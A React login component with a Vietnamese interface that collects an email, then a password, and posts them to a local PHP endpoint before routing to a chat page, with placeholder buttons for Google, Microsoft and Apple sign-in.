import { useState } from "react";
import { useNavigate, Link } from "react-router-dom";

function App() {
    const [formData, setFormData] = useState({ email: "" });
    const [showPasswordForm, setShowPasswordForm] = useState(false);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");
    const [showPassword, setShowPassword] = useState(false);
    const navigate = useNavigate();

    const handleChange = (e) => {
        setFormData({ ...formData, [e.target.id]: e.target.value });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (showPasswordForm) {
            setLoading(true);
            setError("");

            try {
                const response = await fetch("http://localhost:3000/server/index.php", {
                    method: "POST",
                    mode: "cors",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(formData),
                });

                const data = await response.json();

                if (data.status === "ok") {
                    navigate("/chat/info");
                } else {
                    setError("Invalid email or password");
                }
                // eslint-disable-next-line no-unused-vars
            } catch (error) {
                setError("An error occurred. Please try again later.");
            } finally {
                setLoading(false);
            }
        } else {
            // (Optional) Email validation
            if (!validateEmail(formData.email)) {
                setError("Please enter a valid email address");
                return;
            }
            setShowPasswordForm(true);
        }
    };

    // A basic email validation function (you can enhance this)
    const validateEmail = (email) => {
        return String(email)
            .toLowerCase()
            .match(
                /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
            );
    };

    const toggleShowPassword = () => {
        setShowPassword(!showPassword);
    };

    return (
        <div className="App font-sans bg-gray-100 h-screen flex items-center justify-center">
            <form
                method="post"
                onSubmit={handleSubmit}
                className="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4 w-96"
            >
                {showPasswordForm ? (
                    <>
                        <h2 className="text-2xl font-bold mb-6 text-center">
                            Nhập mật khẩu của
                            <br />
                            bạn
                        </h2>
                        {error && <div className="text-red-500 text-sm mb-2">{error}</div>}
                        <div className="mb-4 relative">
                            <input
                                type="email"
                                id="email"
                                name="email"
                                className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline pr-10"
                                value={formData.email}
                                onChange={handleChange}
                                readOnly
                            />
                            <span className="absolute inset-y-0 right-0 flex items-center mr-4 text-teal-500 cursor-pointer">
                                Sửa
                            </span>
                        </div>
                        <div className="mb-4 relative">
                            <input
                                type={showPassword ? "text" : "password"}
                                id="password"
                                name="password"
                                className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline pr-10"
                                value={formData.password}
                                onChange={handleChange}
                                required
                            />
                            <span
                                onClick={toggleShowPassword}
                                className="absolute inset-y-0 right-0 flex items-center mr-4 text-gray-500 cursor-pointer"
                            >
                                <i className={`fa ${showPassword ? "fa-eye-slash" : "fa-eye"}`}></i>
                            </span>
                        </div>
                        <Link to="/forgot-password" className="text-left text-teal-500">
                            Quên mật khẩu?
                        </Link>
                        <button
                            type="submit"
                            className="bg-teal-500 hover:bg-teal-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline w-full mt-4"
                            disabled={loading} // Disable button while loading
                        >
                            {loading ? "Đang đăng nhập..." : "Tiếp tục"}
                        </button>
                    </>
                ) : (
                    <>
                        <h2 className="text-2xl font-bold mb-6 text-center">
                            Chào mừng trở lại
                        </h2>
                        {error && <div className="text-red-500 text-sm mb-2">{error}</div>}
                        <div className="mb-4">
                            <label
                                htmlFor="email"
                                className="block text-gray-700 text-sm font-bold mb-2"
                            >
                                Địa chỉ email*
                            </label>
                            <input
                                type="email"
                                id="email"
                                name="email"
                                className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                                value={formData.email}
                                onChange={handleChange}
                                required
                            />
                        </div>
                        <button
                            type="submit"
                            className="bg-teal-500 hover:bg-teal-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline w-full"
                            disabled={loading}
                        >
                            {loading ? "Đang kiểm tra..." : "Tiếp tục"}
                        </button>
                    </>
                )}

                <p className="text-center mt-4 text-sm">
                    Chưa có tài khoản?{" "}
                    <Link to="/register" className="text-teal-500 hover:text-teal-700">
                        Đăng ký
                    </Link>
                </p>

                <hr className="my-6 border-gray-300" />

                <h6 className="text-center text-gray-600">HOẶC</h6>

                <div className="mt-6">
                    <button className="bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-2 px-4 rounded-lg focus:outline-none focus:shadow-outline w-full flex items-center justify-center mb-2">
                        Tiếp tục với Google
                    </button>
                    <button className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg focus:outline-none focus:shadow-outline w-full flex items-center justify-center mb-2">

                        Tiếp tục với Microsoft Account
                    </button>
                    <button className="bg-black hover:bg-gray-800 text-white font-bold py-2 px-4 rounded-lg focus:outline-none focus:shadow-outline w-full flex items-center justify-center">
                        Tiếp tục với Apple
                    </button>
                </div>
            </form>
        </div>
    );
}

export default App;